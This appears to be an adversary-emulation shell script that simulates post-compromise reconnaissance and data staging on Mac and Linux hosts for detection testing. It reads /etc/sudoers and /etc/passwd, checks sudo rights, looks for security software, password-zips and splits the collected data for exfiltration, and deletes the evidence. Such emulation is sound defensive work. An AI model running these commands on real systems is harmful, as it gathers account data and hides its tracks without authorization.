#!/bin/sh

# Chain Reaction Ranger
# NOTE it is a BAD idea to execute scripts from a repo that you do not control.
# NOTE We recommend executing from a server that you control.
# NOTE Thank You :)
# This particular Chain Reaction focuses on simulating reconnaisance and staging files for exfiltration

# Tactic: Collection
# Technique: Data Staged https://attack.mitre.org/wiki/Technique/T1074
# Tactic: Defense Evasion
# Technique: Hidden Files and Directories https://attack.mitre.org/wiki/Technique/T1158
# Create a hidden directory to store our collected data in

mkdir -p /tmp/.staging_art/
mkdir -p /tmp/.exfil/

# Tactic: Discovery
# Technique: System Information Discovery https://attack.mitre.org/wiki/Technique/T1082
# Determine Platform and Gather System Information

SYSINF=/tmp/.staging_art/system.txt
MACCHECK="$(sw_vers -productName | cut -d ' ' -f1)"

if [[ "$MACCHECK" == "Mac" ]]; then
  PLAT="Mac"
else
  PLAT="Linux"
fi

echo "Testing: Platform is" $PLAT

echo "Platform: " $PLAT >> $SYSINF
echo "Kernel:" >> $SYSINF && uname -a >> $SYSINF

echo "Testing: Gathering General Release Information"

if [ "$PLAT" = "Mac" ]; then
  echo "Testing: Gathering macOS Release Information"
  echo "System Profiler:" >> $SYSINF
  system_profiler >> $SYSINF 2> /dev/null
else
  echo "Testing: Gathering Linux Release Information"
  echo "Release:" >> $SYSINF
  lsb_release >> $SYSINF 2> /dev/null
fi

# Tactic: Discovery
# Technique: Account Discovery https://attack.mitre.org/wiki/Technique/T1087
# Collect User Account Information

USERINF=/tmp/.staging_art/users.txt

echo "Testing: Gathering User Information"

echo "Whoami:" >> $USERINF && whoami >> $USERINF
echo "Current User Activity:" >> $USERINF && w >> $USERINF 2> /dev/null
echo "Sudo Privs" >> $USERINF && sudo -l -n >> $USERINF 2> /dev/null
echo "Sudoers" >> $USERINF && cat /etc/sudoers >> $USERINF 2> /dev/null
echo "Last:" >> $USERINF && last >> $USERINF 2> /dev/null

if [ "$PLAT" == "Mac" ]; then
  echo "Testing: Gathering Mac Group Information"
  echo "Group Information:" >> $USERINF
  dscl . list /Groups >> $USERINF
  dscacheutil -q group >> $USERINF
else
  echo "Testing: Gathering Linux Group Information"
  echo "Group Information:" >> $USERINF
  cat /etc/passwd >> $USERINF
  echo "Elevated Users" >> $USERINF && grep -v -E "^#" /etc/passwd | awk -F: '$3 == 0 { print $1}' >> $USERINF
fi

# Tactic: Discovery
# Technique: Security Software Discovery https://attack.mitre.org/wiki/Technique/T1063
# Check for common security Software

SECINF=/tmp/.staging_art/security.txt

echo "Testing: Gathering Security Software Information"

echo "Running Security Processes" >> $SECINF && ps ax | grep -v grep | grep -e Carbon -e Snitch -e OpenDNS -e RTProtectionDaemon -e CSDaemon -e cma >> $SECINF

# Tacttic: Exfiltration
# Technique:  Data Compresssed https://attack.mitre.org/wiki/Technique/T1002
# Technique:  Data Encrypted https://attack.mitre.org/wiki/Technique/T1022
# Compress and encrypt all collected data

echo "Testing: Zip up the Recon"
zip --password "Hope You Have Eyes on This!!" /tmp/.staging_art/loot.zip /tmp/.staging_art/* > /dev/null 2>&1

# Tacttic: Exfiltration
# Technique: Data Transfer Size Limits https://attack.mitre.org/wiki/Technique/T1030
# Split the file up into 23 byte chunks for easier exfiltration

echo "Testing: Split the file for Exfil"
split -a 15 -b 23 "/tmp/.staging_art/loot.zip" "/tmp/.exfil/loot.zip.part-"

# Tactic: Defense Evasion
# Technique: Delete File https://attack.mitre.org/wiki/Technique/T1107
# Delete evidence

rm -rf /tmp/.staging_art/

# Optionally, delete exfil directory to clean up
# rm -rf /tmp/.exfil/
